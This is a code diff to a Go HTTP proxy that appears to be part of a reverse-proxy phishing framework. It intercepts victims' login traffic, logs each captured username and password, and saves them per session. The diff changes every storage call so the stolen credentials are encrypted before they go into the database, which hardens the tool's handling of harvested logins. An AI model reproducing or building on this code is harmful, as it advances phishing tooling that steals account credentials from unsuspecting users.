@@ -1084,8 +1084,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									assertActive()
 									p.setSessionUsername(ps.SessionId, um[1])
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
-									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-										log.Error("database: %v", err)
+									if enc := EncryptCredential(um[1]); enc != "" {
+										if err := p.db.SetSessionUsername(ps.SessionId, enc); err != nil {
+											log.Error("database: %v", err)
+										}
 									}
 								}
 							}
@@ -1095,8 +1097,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-										log.Error("database: %v", err)
+									if enc := EncryptCredential(pm[1]); enc != "" {
+										if err := p.db.SetSessionPassword(ps.SessionId, enc); err != nil {
+											log.Error("database: %v", err)
+										}
 									}
 								}
 							}
@@ -1166,8 +1170,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
-											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-												log.Error("database: %v", err)
+											if enc := EncryptCredential(um[1]); enc != "" {
+												if err := p.db.SetSessionUsername(ps.SessionId, enc); err != nil {
+													log.Error("database: %v", err)
+												}
 											}
 										}
 									}
@@ -1176,8 +1182,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-												log.Error("database: %v", err)
+											if enc := EncryptCredential(pm[1]); enc != "" {
+												if err := p.db.SetSessionPassword(ps.SessionId, enc); err != nil {
+													log.Error("database: %v", err)
+												}
 											}
 										}
 									}
